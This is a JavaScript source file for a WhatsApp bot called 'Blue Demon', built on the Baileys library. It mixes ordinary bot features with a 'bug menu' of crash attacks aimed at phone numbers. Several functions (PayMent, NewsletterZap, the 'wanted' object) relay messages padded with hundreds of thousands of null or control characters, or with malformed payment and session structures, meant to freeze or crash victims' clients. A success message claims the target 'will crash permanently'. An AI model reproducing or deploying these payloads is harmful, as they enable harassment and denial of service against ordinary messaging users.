/*
 SCRIPT BYY : ABYY
 BASE ORI : byxxXZOO/PAKTZY/QIOO
 
 TQ TO
 
 ALLAH
 ORTU
 PEMBUAT SC LAINNYA...
 
 #ABYYKONTOLGEDE😏😏
*/
module.exports = async (byxx, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await byxx.decodeJid(byxx.user.id)
const sender = m.key.fromMe ? (byxx.user.id.split(':')[0]+'@s.whatsapp.net' || byxx.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await byxx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./rabyyx.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const thebug = fs.readFileSync(`./database/image/thebug.jpg`)
const byxz = fs.readFileSync(`./database/image/byzx.jpg`) 
const blue = fs.readFileSync(`./database/image/blue.jpg`) 
const bluex = fs.readFileSync(`./database/image/bluex.jpg`) 
const bluexx = fs.readFileSync(`./database/image/bluexx.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = '𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴☠️'
const bugsuc = '『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n\n  𝐍𝐎𝐓𝐄\n> ɪꜰ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɪꜱ ꜱᴛɪʟʟ ᴏɴʟɪɴᴇ, ᴊᴜꜱᴛ ʟᴇᴀᴠᴇ ɪᴛ, ʙᴜᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪʟʟ ꜱᴛɪʟʟ ᴄʀᴀꜱʜ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ'
// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			freeze
		} = require("./database/virtex/freeze.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return byxx.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Africa/Lagos').format('HH : mm :ss')
        const wit = moment.tz('Africa/Lagos').format('HH : mm : ss')
        const wita = moment.tz('Africa/Lagos').format('HH : mm : ss')

        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Wagwan🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Wagwan🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Wagwan🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Wagwan 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Wagwan🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Wagwan🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Wagwan🌃'
        }
       
    byxx.autoshalat = byxx.autoshalat ? byxx.autoshalat : {}
    let id = m.chat
    if (id in byxx.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Africa/Lagos"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        byxx.autoshalat[id] = [
            byxx.sendMessage(m.chat, {
audio: {
    url: 'https://github.com/Bolaolat/xxbug/raw/refs/heads/main/Bxbxbb/haha.mp3'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Have a nice day ahead ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   byxx.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: byxx.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By blue`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await byxx.sendPresenceUpdate('composing', jid)
      return byxx.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await byxx.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await byxx.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			byxx.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "𝙱𝙻𝚄𝙴x𝙳𝙴𝙼𝙾𝙽" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `DEMON TECH`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await byxx.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await byxx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await byxx.getName(i + '@s.whatsapp.net')}\n
FN:${await byxx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await byxx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `DEMON`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!byxx.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"💞ʜᴇʟʟᴏ ᴡᴏʀʟᴅ💞",
"ʟᴏᴀᴅɪɴɢ...",
"ꜱᴜᴄᴄᴇꜱꜱ✅", 
]
let { key } = await byxx.sendMessage(from, {text: '.'})

for (let i = 0; i < baralod.length; i++) {
await byxx.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
byxx.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            byxx.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ʙʟᴜᴇ ᴄʀᴀꜱʜᴇʀ`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/bluex.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
byxx.sendMessage(m.chat, {text: `*Antilink Group Detected*\n\n You Will Be Removed From The Group ${groupMetadata.subject}`}, {quoted:m})
byxx.groupParticipantsUpdate(m.chat, [sender], 'delete')
byxx.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'blue': case 'menu': {
darkphonk = fs.readFileSync('./database/haha.mp3')
const version = require("baileys/package.json").version
const menu = `┏━━━ ｢ \`𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽͖\` ｣ ━━━❐
┃ ✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃ ✾ᐉ 𝐁𝐨𝐭 : ${namabot}
┃ ✾ᐉ 𝐑𝐮𝐧 : *${run}*
┗━━━━━━━━━━━━━━━━━━❐
\`💞ᴘʀᴏᴛᴇᴄᴛ ᴛʜᴏꜱᴇ ʏᴏᴜ ʟᴏᴠᴇ💞\`
`
let sections = [{
title: '⿻  ⌜ LIST MENU ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨',
id: '.allmenu'
}]
},
{
title: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 [𝗔𝗟𝗣𝗛𝗔 𝗕𝗨𝗚𝗦🥶]',
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗕𝗨𝗚 𝗠𝗘𝗡𝗨', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝗕𝗨𝗧𝗧𝗢𝗡',
rows: [{
title: '𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚𝗦', 
id: '.buttonbug'
}]
}]
let listMessage = {
    title: '𝗠𝗘𝗡𝗨͖', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/blue.jpg")}, { upload: byxx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await byxx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await byxx.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'bugmenu': {
const version = require("baileys/package.json").version
const bugmenu = `┏─── ｢ \`𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽͖\` ｣ ──❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐁𝐨𝐭 : ${namabot}
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​

┏─『 \`𝗠𝗘𝗗𝗜𝗨𝗠 𝗕𝗨𝗚\` 』
│ ⑄ longtrip 𝟲𝟮𝘅𝘅𝘅
│ ⑄ bluedid 𝟲𝟮𝘅𝘅𝘅
│ ⑄ might 𝟲𝟮𝘅𝘅𝘅
│ ⑄ crazy 𝟲𝟮𝘅𝘅𝘅
│ ⑄ galaxy 𝟲𝟮𝘅𝘅𝘅
│ ⑄ invictus 𝟲𝟮𝘅𝘅𝘅
│ ⑄ univers 𝟲𝟮𝘅𝘅𝘅
│ ⑄ angkasa 𝟲𝟮𝘅𝘅𝘅
│
│『 \`𝗛𝗜𝗚𝗛 𝗕𝗨𝗚\` 』
│ ⑄ bijihard 𝟲𝟮𝘅𝘅𝘅
│ ⑄ bokepros 𝟲𝟮𝘅𝘅𝘅
│ ⑄ anjingliar 𝟲𝟮𝘅𝘅𝘅
│ ⑄ autocrash 𝟲𝟮𝘅𝘅𝘅
│ ⑄ pornhub 𝟲𝟮𝘅𝘅𝘅
│ ⑄ ahhcrot 𝟲𝟮𝘅𝘅𝘅
│
│『 \`𝗘𝗫𝗧𝗥𝗘𝗠𝗘 𝗕𝗨𝗚\` 』
│ ⑄ abyyhard 𝟲𝟮𝘅𝘅𝘅
│ ⑄ abyycogan 𝟲𝟮𝘅𝘅𝘅
│ ⑄ abyycrt 𝟲𝟮𝘅𝘅𝘅
│ ⑄ abyykeren 𝟲𝟮𝘅𝘅𝘅
│ ⑄ abyybantai 𝟲𝟮𝘅𝘅𝘅
┗─────────────❐`
let sections = [{
title: '⿻  ⌜ LIST MENU ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨',
id: '.allmenu'
}]
},
{
title: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 [𝗔𝗟𝗣𝗛𝗔 𝗕𝗨𝗚𝗦🥶]',
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗕𝗨𝗚 𝗠𝗘𝗡𝗨', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝗕𝗨𝗧𝗧𝗢𝗡',
rows: [{
title: '𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚𝗦', 
id: '.buttonbug'
}]
}]
let listMessage = {
    title: '𝗠𝗘𝗡𝗨͖', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/blue.jpg")}, { upload: byxx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await byxx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'allmenu': {
const version = require("baileys/package.json").version
const allmenu = `┏─── ｢ \`𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽͖\` ｣ ──❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐁𝐨𝐭 : ${namabot}
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┗──────────────❐
┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴀᴅᴅᴏᴡɴᴇʀ
│ ⑄ ᴀᴅᴅᴘʀᴇᴍ
│ ⑄ ᴅᴇʟᴏᴡɴᴇʀ
│ ⑄ ᴅᴇʟᴘʀᴇᴍ
│ ⑄ ᴘᴜʙʟɪᴄ
│ ⑄ sᴇʟғ
┗─────────────❐

┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ⑄ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│ ⑄ ᴀɪ <ᴛᴇᴋs>
┗─────────────❐

┏─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ʜᴅᴠɪᴅᴇᴏ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>
│ ⑄ ꜱᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>
┗─────────────❐

┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ꜱᴠᴄᴏɴᴛᴀᴄᴛ 
│ ⑄ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│ ⑄ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
│ ⑄ ᴋɪᴄᴋ <ᴛᴀɢ>
│ ⑄ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
